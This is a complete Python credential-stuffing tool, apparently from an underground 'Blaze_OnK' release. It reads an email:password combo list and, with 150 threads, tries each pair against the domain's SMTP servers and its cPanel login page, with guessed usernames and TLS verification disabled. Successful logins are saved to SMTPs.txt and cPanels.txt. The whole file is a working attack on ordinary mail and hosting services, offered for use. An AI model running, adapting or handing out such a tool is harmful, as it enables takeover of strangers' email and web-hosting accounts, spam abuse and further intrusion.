import sys, requests, re, smtplib, os, time
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fy  =   Fore.YELLOW
fb  =   Fore.BLUE

requests.urllib3.disable_warnings()

def log() :
	log =  """  
   ------------------Blaze_OnK-----------Telegram-----Xreactor.org----
	""".format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fw, fg)
	for line in log.split("\n"):
		print(line)
		time.sleep(0.15)

def input_Fox(txt):
    try :
        if (sys.version_info[0] < 3):
            return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input()
    except:
        return False

def URLdomain_Fox(site):
    if (site.startswith("http://")) :
        site = site.replace("http://", "")
    elif (site.startswith("https://")) :
        site = site.replace("https://", "")
    if ('www.' in site) :
        site = site.replace("www.", "")
    if ('/' in site):
        site = site.rstrip()
        site = site.split('/')[0]
    return site

def SMTP_Fox(c):
    try :
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        host = URLdomain_Fox(email.split('@')[1])
        ports = ['587', '25', '465']
        for port in ports :
            try :
                if (port == '465'):
                    server = smtplib.SMTP_SSL(host, port)
                else :
                    server = smtplib.SMTP(host, port)
                server.starttls()
                server.login(email, pwd)
                smtp = '{}|{}|{}|{}'.format(host, port, email, pwd)
                open('SMTPs.txt', 'a').write(smtp + '\n')
                print  (' -| {}{} [SMTP]'.format(fg, smtp))
                break
            except :
                pass
    except :
        pass

def CpanelChecker_Fox(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_Fox(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".","")
        users = [user1, user2]
        if (len(user1) > 8):
            user3 = user1[:8]
            users.append(user3)
        for user in users :
            try :
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
                login = requests.post('https://{}:2083/login/'.format(domain), verify=False, data=postlogin, timeout=15).content
                if ('filemanager' in login):
                    cp = 'https://{}:2083|{}|{}'.format(domain, user, pwd)
                    open('cPanels.txt', 'a').write(cp + '\n')
                    print  (' -| {}{} [cPanel]'.format(fg, cp))
                    break
            except :
                break
    except :
        pass

def exploit(c):
    try :
        c = c.strip()
        print  (' -| ' + c)
        SMTP_Fox(c)
        CpanelChecker_Fox(c)
    except:
        pass

def run():
    log()
    try:
        target = open(sys.argv[1], 'r')
    except:
        yList = str(input_Fox('\n   Your Combo-List@Blaze_OnK --> : '))
        if (not os.path.isfile(yList)):
            print("\n   {}({}) File does not exist!\n".format(fr, yList))
            sys.exit(0)
        target = open(yList, 'r')
    mp = Pool(150)
    mp.map(exploit, target)
    mp.close()
    mp.join()

run()
